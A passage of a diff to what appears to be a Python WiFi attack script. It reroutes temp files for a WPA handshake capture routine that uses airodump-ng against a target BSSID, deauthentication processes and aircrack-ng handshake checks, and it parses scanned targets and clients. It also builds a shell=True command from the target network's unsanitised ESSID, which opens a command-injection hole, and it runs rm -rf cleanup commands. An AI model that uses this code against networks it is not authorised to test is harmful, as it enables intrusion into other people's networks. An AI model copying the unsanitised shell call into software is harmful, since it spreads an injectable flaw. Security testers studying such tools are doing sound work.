+		subprocess.call(['rm','-rf',TEMPDIR+'wpa-01.cap',TEMPDIR+'wpa-01.csv',TEMPDIR+'wpa-01.kismet.csv',\
+						TEMPDIR+'wpa-01.kismet.netxml'])
 		time.sleep(0.1)
 		
-		cmd = ['airodump-ng','-w','wpa','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],IFACE]
+		cmd = ['airodump-ng','-w',TEMPDIR+'wpa','-c',TARGETS[index][1],'--bssid',TARGETS[index][0],IFACE]
 		proc_read = subprocess.Popen(cmd, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 		
 		print GR+'['+sec2hms(WPA_MAXWAIT)+'] '+W+'starting wpa handshake capture'
@@ -1994,7 +2153,7 @@ def attack_wpa(index):
 			sys.stdout.flush()
 			
 			# check for handshake using aircrack
-			crack='echo "" | aircrack-ng -a 2 -w - -e "' + TARGETS[index][8] + '" wpa-01.cap'
+			crack='echo "" | aircrack-ng -a 2 -w - -e "' + TARGETS[index][8] + '" '+TEMPDIR+'wpa-01.cap'
 			proc_crack = subprocess.Popen(crack, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'), shell=True)
 			proc_crack.wait()
 			txt=proc_crack.communicate()
@@ -2017,7 +2176,7 @@ def attack_wpa(index):
 				temp=temp+temp2
 				
 				# copy the cap file for safe-keeping
-				subprocess.call(['cp','wpa-01.cap',temp + '.cap'])
+				subprocess.call(['cp',TEMPDIR+'wpa-01.cap',temp + '.cap'])
 				
 				print '\r'+GR+'['+get_time(WPA_MAXWAIT,TIME_START)+ \
 						'] '+W+'sent 3 deauth packets; '+G+'handshake captured!'+W+' saved as "'+G+temp+'.cap'+W+'"'
@@ -2038,7 +2197,7 @@ def attack_wpa(index):
 			
 			# check wpa-01.csv for new clients
 			try:
-				f=open('wpa-01.csv','r')
+				f=open(TEMPDIR+'wpa-01.csv','r')
 				csv=f.read().split('\n')
 				f.close()
 			except Exception:
@@ -2068,7 +2227,8 @@ def attack_wpa(index):
 	
 	except KeyboardInterrupt:
 		# clean up
-		subprocess.call(['rm','-rf','wpa-01.cap','wpa-01.csv','wpa-01.kismet.csv','wpa-01.kismet.netxml'])
+		subprocess.call(['rm','-rf',TEMPDIR+'wpa-01.cap',TEMPDIR+'wpa-01.csv',TEMPDIR+'wpa-01.kismet.csv',\
+						TEMPDIR+'wpa-01.kismet.netxml'])
 		try:
 			os.kill(proc_read.pid, signal.SIGTERM)
 			os.kill(proc_deauth.pid, signal.SIGTERM)
@@ -2133,7 +2293,8 @@ def attack_wpa(index):
 		
 	print W
 	# remove airodump log files
-	subprocess.call(['rm','-rf','wpa-01.cap','wpa-01.csv','wpa-01.kismet.csv','wpa-01.kismet.netxml'])
+	subprocess.call(['rm','-rf',TEMPDIR+'wpa-01.cap',TEMPDIR+'wpa-01.csv',TEMPDIR+'wpa-01.kismet.csv',\
+					TEMPDIR+'wpa-01.kismet.netxml'])
 	
 	# try to kill all processes
 	try:
@@ -2168,10 +2329,11 @@ def gettargets():
 	waiting = -1
 	
 	try:
-		subprocess.call(['rm','-rf','wifite-01.cap','wifite-01.csv','wifite-01.kismet.csv','wifite-01.kismet.netxml'])
+		subprocess.call(['rm','-rf',TEMPDIR+'wifite-01.cap',TEMPDIR+'wifite-01.csv',TEMPDIR+'wifite-01.kismet.csv',\
+						TEMPDIR+'wifite-01.kismet.netxml'])
 		time.sleep(0.3)
 		
-		cmd=['airodump-ng','-a','-w','wifite','--output-format','csv']
+		cmd=['airodump-ng','-a','-w',TEMPDIR+'wifite','--output-format','csv']
 		if CHANNEL != '0':
 			cmd.append('-c')
 			cmd.append(CHANNEL)
@@ -2258,8 +2420,9 @@ def gettargets():
 		except UnboundLocalError:
 			pass
 	
-	subprocess.call(['rm','-rf','wifite-01.cap','wifite-01.csv','wifite-01.kismet.csv','wifite-01.kismet.netxml'])
-	subprocess.call('rm -rf wifite-01*.xor', shell=True)
+	subprocess.call(['rm','-rf',TEMPDIR+'wifite-01.cap',TEMPDIR+'wifite-01.csv',TEMPDIR+'wifite-01.kismet.csv',\
+					TEMPDIR+'wifite-01.kismet.netxml'])
+	subprocess.call('rm -rf '+TEMPDIR+'wifite-01*.xor', shell=True)
 	
 	if ESSID == 'all':
 		
@@ -2375,7 +2538,7 @@ def parsetargets():
 	TARGETS=[]
 	CLIENTS={}
 	try:
-		f = open('wifite-01.csv', 'r')
+		f = open(TEMPDIR+'wifite-01.csv', 'r')
 		clients=False
 		lines = f.readlines()
 		for line in lines:
@@ -2497,10 +2660,6 @@ def sec2hms(sec):
 
 
 main() # launch the main method
-
-
-# remove the temp dir
-subprocess.call(['rm','-rf',TEMPDIR])
 
 # helpful diagram!
 # TARGETS list format
